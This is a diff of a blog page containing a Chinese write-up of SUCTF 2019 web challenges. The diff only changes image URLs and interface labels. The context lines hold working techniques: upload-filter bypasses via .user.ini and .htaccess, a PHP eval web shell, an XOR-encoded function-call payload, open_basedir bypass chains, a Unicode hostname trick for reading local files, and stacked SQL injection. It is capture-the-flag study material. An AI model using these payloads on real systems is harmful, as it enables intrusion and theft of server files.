@@ -119,16 +119,16 @@
       <div class="py-5 z-depth-3" id="board">
         <div class="post-content mx-auto">
           <div class="markdown-body">
-            <h1><span id="checkin">CheckIn</span></h1><p>1、进入题目后是一个简单的上传页面：<br><img src="/2019/08/26/SUCTF-2019-部分复现/20190819172654291.png" srcset="https://s2.ax1x.com/2019/10/31/K5aqhQ.gif" alt="在这里插入图片描述"><br>先尝试上传普通的图片马，发现会显示<code>&lt;? in contents!</code>，过滤了<code>&lt;?</code>，可以使用<code>&lt;script language=&#39;php&#39;&gt;&lt;/scrip&gt;</code>绕过。</p>
-<p>修改后再次上传发现显示<code>exif_imagetype:not image!</code>，还用了<code>exif_imagetype()</code>进行检验，可以加上GIF89a进行绕过。<br><img src="/2019/08/26/SUCTF-2019-部分复现/20190819173405352.png" srcset="https://s2.ax1x.com/2019/10/31/K5aqhQ.gif" alt="在这里插入图片描述"><br>但是后缀正则过滤了<code>php</code>字符，想直接绕过是没戏了。</p>
-<p>2、于是考虑解析漏洞，发现服务端不是Apache而是Nginx，所以常见的上传<code>.hatcess</code>文件不可行。<br><img src="/2019/08/26/SUCTF-2019-部分复现/20190819173804810.png" srcset="https://s2.ax1x.com/2019/10/31/K5aqhQ.gif" alt="在这里插入图片描述"></p>
+            <h1><span id="checkin">CheckIn</span></h1><p>1、进入题目后是一个简单的上传页面：<br><img src="/2019/08/26/SUCTF-2019-部分复现/20190819172654291.png" srcset="https://s2.ax1x.com/2019/10/30/K5JVXT.gif" alt="在这里插入图片描述"><br>先尝试上传普通的图片马，发现会显示<code>&lt;? in contents!</code>，过滤了<code>&lt;?</code>，可以使用<code>&lt;script language=&#39;php&#39;&gt;&lt;/scrip&gt;</code>绕过。</p>
+<p>修改后再次上传发现显示<code>exif_imagetype:not image!</code>，还用了<code>exif_imagetype()</code>进行检验，可以加上GIF89a进行绕过。<br><img src="/2019/08/26/SUCTF-2019-部分复现/20190819173405352.png" srcset="https://s2.ax1x.com/2019/10/30/K5JVXT.gif" alt="在这里插入图片描述"><br>但是后缀正则过滤了<code>php</code>字符，想直接绕过是没戏了。</p>
+<p>2、于是考虑解析漏洞，发现服务端不是Apache而是Nginx，所以常见的上传<code>.hatcess</code>文件不可行。<br><img src="/2019/08/26/SUCTF-2019-部分复现/20190819173804810.png" srcset="https://s2.ax1x.com/2019/10/30/K5JVXT.gif" alt="在这里插入图片描述"></p>
 <p>参考这篇文章：<a href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html" target="_blank" rel="noopener">user.ini文件构成的PHP后门</a></p>
 <p>php.ini一定很熟悉了，是php中的配置文件，其中提到了.user.ini文件:</p>
-<p>链接：<a href="https://www.php.net/manual/zh/configuration.changes.modes.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/configuration.changes.modes.php</a><br><img src="/2019/08/26/SUCTF-2019-部分复现/20190819174532748.png" srcset="https://s2.ax1x.com/2019/10/31/K5aqhQ.gif" alt="在这里插入图片描述"></p>
+<p>链接：<a href="https://www.php.net/manual/zh/configuration.changes.modes.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/configuration.changes.modes.php</a><br><img src="/2019/08/26/SUCTF-2019-部分复现/20190819174532748.png" srcset="https://s2.ax1x.com/2019/10/30/K5JVXT.gif" alt="在这里插入图片描述"></p>
 <p>再看一下文档对于.user.ini文件的解释：</p>
 <p>链接：<a href="https://www.php.net/manual/zh/configuration.file.per-user.php" target="_blank" rel="noopener">https://www.php.net/manual/zh/configuration.file.per-user.php</a></p>
-<p><img src="/2019/08/26/SUCTF-2019-部分复现/20190819174740478.png" srcset="https://s2.ax1x.com/2019/10/31/K5aqhQ.gif" alt="在这里插入图片描述"><br>简单来说，它起的作用和.htaccess文件差不多，可以通过在目录下增加.user.ini文件来修改一些配置，可以通过.user.ini文件设置除了<code>PHP_INI_SYSTEM</code>以外的所有模式的选项，且不需要重启服务器中间件，只需要等待<code>user_ini.cache_ttl</code>所设置的时间（默认为300秒），即可被重新加载。</p>
-<p>下面就找php.ini中可以利用的配置项，如下:<br><img src="/2019/08/26/SUCTF-2019-部分复现/20190819175930926.png" srcset="https://s2.ax1x.com/2019/10/31/K5aqhQ.gif" alt="在这里插入图片描述"><br>即<code>auto_prepend_file</code>配置项可以指定在主文件之前自动解析的文件的名称，并包含该文件，就像使用require函数调用它一样。</p>
+<p><img src="/2019/08/26/SUCTF-2019-部分复现/20190819174740478.png" srcset="https://s2.ax1x.com/2019/10/30/K5JVXT.gif" alt="在这里插入图片描述"><br>简单来说，它起的作用和.htaccess文件差不多，可以通过在目录下增加.user.ini文件来修改一些配置，可以通过.user.ini文件设置除了<code>PHP_INI_SYSTEM</code>以外的所有模式的选项，且不需要重启服务器中间件，只需要等待<code>user_ini.cache_ttl</code>所设置的时间（默认为300秒），即可被重新加载。</p>
+<p>下面就找php.ini中可以利用的配置项，如下:<br><img src="/2019/08/26/SUCTF-2019-部分复现/20190819175930926.png" srcset="https://s2.ax1x.com/2019/10/30/K5JVXT.gif" alt="在这里插入图片描述"><br>即<code>auto_prepend_file</code>配置项可以指定在主文件之前自动解析的文件的名称，并包含该文件，就像使用require函数调用它一样。</p>
 <p>注：还有一个<code>auto_append_file</code>选项，是在解析后进行包含。</p>
 <p>利用这两个配置项进行包含的前提是含有<code>.user.ini</code>的文件夹下需要有正常的<code>php</code>文件。</p>
 <p>4、利用上述配置项进行包含的前提是：含有<code>.user.ini</code>的文件夹下需要有正常的<code>php</code>文件。</p>
@@ -145,10 +145,10 @@ auto_prepend_file=shell.jpg
 <p>#define test_width 16</p>
 <p>#define test_height 7</p>
 </blockquote>
-<p>5、成功上传.user.ini文件：<br><img src="/2019/08/26/SUCTF-2019-部分复现/20190819182711392.png" srcset="https://s2.ax1x.com/2019/10/31/K5aqhQ.gif" alt="在这里插入图片描述"></p>
-<p>接下来上传包含一句话木马的jpg文件：<br><img src="/2019/08/26/SUCTF-2019-部分复现/20190819182830861.png" srcset="https://s2.ax1x.com/2019/10/31/K5aqhQ.gif" alt="在这里插入图片描述"></p>
+<p>5、成功上传.user.ini文件：<br><img src="/2019/08/26/SUCTF-2019-部分复现/20190819182711392.png" srcset="https://s2.ax1x.com/2019/10/30/K5JVXT.gif" alt="在这里插入图片描述"></p>
+<p>接下来上传包含一句话木马的jpg文件：<br><img src="/2019/08/26/SUCTF-2019-部分复现/20190819182830861.png" srcset="https://s2.ax1x.com/2019/10/30/K5JVXT.gif" alt="在这里插入图片描述"></p>
 <p>这样我们上传的文件就被包含在同目录的那个index.php中了，然后连接此文件即可。</p>
-<p><img src="/2019/08/26/SUCTF-2019-部分复现/2019082723380334.png" srcset="https://s2.ax1x.com/2019/10/31/K5aqhQ.gif" alt="在这里插入图片描述"></p>
+<p><img src="/2019/08/26/SUCTF-2019-部分复现/2019082723380334.png" srcset="https://s2.ax1x.com/2019/10/30/K5JVXT.gif" alt="在这里插入图片描述"></p>
 <p><br></p>
 <h1><span id="easyphp">EasyPHP</span></h1><p>1、进入题目后，源码显示在了页面上：</p>
 <pre><code class="php">&lt;?php
@@ -208,16 +208,16 @@ for($i=0;$i&lt;strlen($argv[1]);$i++)
 }
 echo $payload;
 </code></pre>
-<p>得到：<br><img src="/2019/08/26/SUCTF-2019-部分复现/2019082022295714.png" srcset="https://s2.ax1x.com/2019/10/31/K5aqhQ.gif" alt="在这里插入图片描述"></p>
+<p>得到：<br><img src="/2019/08/26/SUCTF-2019-部分复现/2019082022295714.png" srcset="https://s2.ax1x.com/2019/10/30/K5JVXT.gif" alt="在这里插入图片描述"></p>
 <p>所以尝试:</p>
 <pre><code>${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}();&amp;%ff=phpinfo
-</code></pre><p><img src="/2019/08/26/SUCTF-2019-部分复现/2019082022373196.png" srcset="https://s2.ax1x.com/2019/10/31/K5aqhQ.gif" alt="在这里插入图片描述"></p>
+</code></pre><p><img src="/2019/08/26/SUCTF-2019-部分复现/2019082022373196.png" srcset="https://s2.ax1x.com/2019/10/30/K5JVXT.gif" alt="在这里插入图片描述"></p>
 <p>发现成功，于是构造payload：</p>
 <pre><code>${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}();&amp;%ff=get_the_flag
 </code></pre><p>3、接下来就是通过上传来getshell了，这里确实是需要上传<code>.htaccess</code>文件了，绕过方式可以参考这篇文章：<a href="https://www.cnblogs.com/wfzWebSecuity/p/11207145.html" target="_blank" rel="noopener">https://www.cnblogs.com/wfzWebSecuity/p/11207145.html</a></p>
 <ul>
 <li>exif_imagetype() 的绕过方式和上面一样</li>
-<li>这里注意到php版本为7.2所以，不能用<code>&lt;script&gt;</code>标签绕过<code>&lt;?</code>的过滤了，可以通过编码进行绕过，如原来使用utf8编码，如果shell中是用utf16编码则可以Bypass<br><img src="/2019/08/26/SUCTF-2019-部分复现/2019082022585743.png" srcset="https://s2.ax1x.com/2019/10/31/K5aqhQ.gif" alt="在这里插入图片描述"><br>直接利用脚本生成文件：</li>
+<li>这里注意到php版本为7.2所以，不能用<code>&lt;script&gt;</code>标签绕过<code>&lt;?</code>的过滤了，可以通过编码进行绕过，如原来使用utf8编码，如果shell中是用utf16编码则可以Bypass<br><img src="/2019/08/26/SUCTF-2019-部分复现/2019082022585743.png" srcset="https://s2.ax1x.com/2019/10/30/K5JVXT.gif" alt="在这里插入图片描述"><br>直接利用脚本生成文件：</li>
 </ul>
 <pre><code class="python">SIZE_HEADER = b&quot;\n\n#define width 1337\n#define height 1337\n\n&quot;
 
@@ -245,13 +245,13 @@ generate_htacess()
 generate_php_file(&quot;shell.lethe&quot;, &quot;&lt;?php eval($_GET[&#39;cmd&#39;]); die(); ?&gt;&quot;)
 </code></pre>
 <p>然后利用Postman分别构造上传<code>.htaccess</code>和<code>shell.lethe</code>:</p>
-<p><img src="/2019/08/26/SUCTF-2019-部分复现/20190827232500140.png" srcset="https://s2.ax1x.com/2019/10/31/K5aqhQ.gif" alt="在这里插入图片描述"></p>
+<p><img src="/2019/08/26/SUCTF-2019-部分复现/20190827232500140.png" srcset="https://s2.ax1x.com/2019/10/30/K5JVXT.gif" alt="在这里插入图片描述"></p>
 <p>得到文件路径后，就可以利用<code>shell.lethe</code>执行命令了，但是还需要绕过<code>open_basedir</code>。</p>
 <p>参考：<a href="https://skysec.top/2019/04/12/%E4%BB%8EPHP%E5%BA%95%E5%B1%82%E7%9C%8Bopen-basedir-bypass/#ini-set%E8%A6%86%E7%9B%96%E9%97%AE%E9%A2%98%E6%8E%A2%E7%B4%A2" target="_blank" rel="noopener"><br>从PHP底层看open_basedir bypass</a></p>
 <p>于是构造payload如下：<br><code>?cmd=chdir(&#39;/tmp&#39;);mkdir(&#39;lethe&#39;);chdir(&#39;lethe&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;/&#39;);var_dump(ini_get(&#39;open_basedir&#39;));var_dump(glob(&#39;*&#39;));</code></p>
-<p><img src="/2019/08/26/SUCTF-2019-部分复现/20190827232541683.png" srcset="https://s2.ax1x.com/2019/10/31/K5aqhQ.gif" alt="在这里插入图片描述"></p>
+<p><img src="/2019/08/26/SUCTF-2019-部分复现/20190827232541683.png" srcset="https://s2.ax1x.com/2019/10/30/K5JVXT.gif" alt="在这里插入图片描述"></p>
 <p>得到flag位置后，最后读取flag即可，payload：<br><code>?cmd=chdir(&#39;/tmp&#39;);mkdir(&#39;lethe&#39;);chdir(&#39;lethe&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;/&#39;);var_dump(ini_get(&#39;open_basedir&#39;));var_dump(file_get_contents(THis_Is_tHe_F14g));</code></p>
-<p><img src="/2019/08/26/SUCTF-2019-部分复现/20190827232651716.png" srcset="https://s2.ax1x.com/2019/10/31/K5aqhQ.gif" alt="在这里插入图片描述"></p>
+<p><img src="/2019/08/26/SUCTF-2019-部分复现/20190827232651716.png" srcset="https://s2.ax1x.com/2019/10/30/K5JVXT.gif" alt="在这里插入图片描述"></p>
 <p><br></p>
 <h1><span id="pythonginx">Pythonginx</span></h1><p>进入页面后给了源码：</p>
 <pre><code class="python">@app.route(&#39;/getUrl&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;])
@@ -280,7 +280,7 @@ def getUrl():
     &lt;!-- Do you know the nginx? --&gt;
 </code></pre>
 <p>这题的出题思路来自于今年BlackHat的一个议题，相关PPT如下：<br><a href="https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf" target="_blank" rel="noopener">https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf</a></p>
-<p>其中关于Python的内容如下：<br><img src="/2019/08/26/SUCTF-2019-部分复现/20190826233021605.png" srcset="https://s2.ax1x.com/2019/10/31/K5aqhQ.gif" alt="在这里插入图片描述"><br>这里给出altman学长写的一个脚本，用来寻找可用字符：</p>
+<p>其中关于Python的内容如下：<br><img src="/2019/08/26/SUCTF-2019-部分复现/20190826233021605.png" srcset="https://s2.ax1x.com/2019/10/30/K5JVXT.gif" alt="在这里插入图片描述"><br>这里给出altman学长写的一个脚本，用来寻找可用字符：</p>
 <pre><code class="python"># coding:utf-8 
 for i in range(128,65537):    
     tmp=chr(i)    
@@ -297,19 +297,19 @@ for i in range(128,65537):
 <li>前面的url部分应该是<code>suctf.cc</code></li>
 <li>还提到了Nginx，Nginx的配置文件目录为：<code>/usr/local/nginx/conf/nginx.conf</code></li>
 </ul>
-<p>跑上述脚本的的时候，其中有一个可利用字符：<br>                <img src="/2019/08/26/SUCTF-2019-部分复现/20190826235708828.png" srcset="https://s2.ax1x.com/2019/10/31/K5aqhQ.gif" alt="在这里插入图片描述"><br>由此可以想到构造：<code>file://suctf.c℆sr/local/nginx/conf/nginx.conf</code>（另一种绕过方式是利用<code>ℂ</code>来代替<code>c</code>及进行绕过），这样可以读到flag的位置：</p>
-<p><img src="/2019/08/26/SUCTF-2019-部分复现/20190827000438451.png" srcset="https://s2.ax1x.com/2019/10/31/K5aqhQ.gif" alt="在这里插入图片描述"></p>
+<p>跑上述脚本的的时候，其中有一个可利用字符：<br>                <img src="/2019/08/26/SUCTF-2019-部分复现/20190826235708828.png" srcset="https://s2.ax1x.com/2019/10/30/K5JVXT.gif" alt="在这里插入图片描述"><br>由此可以想到构造：<code>file://suctf.c℆sr/local/nginx/conf/nginx.conf</code>（另一种绕过方式是利用<code>ℂ</code>来代替<code>c</code>及进行绕过），这样可以读到flag的位置：</p>
+<p><img src="/2019/08/26/SUCTF-2019-部分复现/20190827000438451.png" srcset="https://s2.ax1x.com/2019/10/30/K5JVXT.gif" alt="在这里插入图片描述"></p>
 <p>最后构造payload：<code>file://suctf.c℆sr/fffffflag</code></p>
 <p><br></p>
 <h1><span id="easysql">Easysql</span></h1><p>（题目好像出现了不少非预期解，而且比赛过程中甚至泄露了源码…）</p>
-<p>进入页面后，提示要求输入正确的Flag即可获得flag，存在堆叠注入如下，但是过滤了flag。<br><img src="/2019/08/26/SUCTF-2019-部分复现/20190827224637818.png" srcset="https://s2.ax1x.com/2019/10/31/K5aqhQ.gif" alt="在这里插入图片描述"></p>
+<p>进入页面后，提示要求输入正确的Flag即可获得flag，存在堆叠注入如下，但是过滤了flag。<br><img src="/2019/08/26/SUCTF-2019-部分复现/20190827224637818.png" srcset="https://s2.ax1x.com/2019/10/30/K5JVXT.gif" alt="在这里插入图片描述"></p>
 <p>根据输入的回显大致判断查询语句为：<code>.. POST[&#39;query&#39;]||flag ...</code></p>
 <p><strong>非预期解</strong></p>
-<p>构造payload：<code>*,1</code>，这样拼接后得到：<code>select *,1||flag from Flag</code> ，即可以查出当前表中全部内容。<br><img src="/2019/08/26/SUCTF-2019-部分复现/20190827225003738.png" srcset="https://s2.ax1x.com/2019/10/31/K5aqhQ.gif" alt="在这里插入图片描述"><br><strong>预期解</strong></p>
+<p>构造payload：<code>*,1</code>，这样拼接后得到：<code>select *,1||flag from Flag</code> ，即可以查出当前表中全部内容。<br><img src="/2019/08/26/SUCTF-2019-部分复现/20190827225003738.png" srcset="https://s2.ax1x.com/2019/10/30/K5JVXT.gif" alt="在这里插入图片描述"><br><strong>预期解</strong></p>
 <p>由于作者没有过滤全，出现了非预期解，而预期解是：通过堆叠注入，设置<code>sql_mode</code>的值为<code>PIPES_AS_CONCAT</code>，从而将<code>||</code>视为字符串的连接操作符而非或运算符。</p>
 <p>所以payload为：<code>1;set sql_mode=PIPES_AS_CONCAT;select 1</code></p>
 <p>这样输出的flag会与1进行拼接，得到：</p>
-<p><img src="/2019/08/26/SUCTF-2019-部分复现/20190827225816413.png" srcset="https://s2.ax1x.com/2019/10/31/K5aqhQ.gif" alt="在这里插入图片描述"></p>
+<p><img src="/2019/08/26/SUCTF-2019-部分复现/20190827225816413.png" srcset="https://s2.ax1x.com/2019/10/30/K5JVXT.gif" alt="在这里插入图片描述"></p>
 <p><br></p>
 <h1><span id="upload-labs2">upload labs2</span></h1>
             <hr>
@@ -341,7 +341,7 @@ for i in range(128,65537):
     <div class="d-none d-lg-block col-lg-2 toc-container">
       
   <div id="toc">
-    <p class="h4"><i class="far fa-list-alt"></i>&nbsp;目录</p>
+    <p class="h4"><i class="far fa-list-alt"></i>&nbsp;TOC</p>
     <div id="tocbot"></div>
   </div>
 
@@ -395,7 +395,7 @@ for i in range(128,65537):
   <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
     <div class="modal-content">
       <div class="modal-header text-center">
-        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <h4 class="modal-title w-100 font-weight-bold">Search</h4>
         <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
           <span aria-hidden="true">&times;</span>
         </button>
@@ -403,7 +403,7 @@ for i in range(128,65537):
       <div class="modal-body mx-3">
         <div class="md-form mb-5">
           <input type="text" id="local-search-input" class="form-control validate">
-          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+          <label data-error="x" data-success="v" for="local-search-input">keyword</label>
         </div>
         <div class="list-group" id="local-search-result"></div>
       </div>
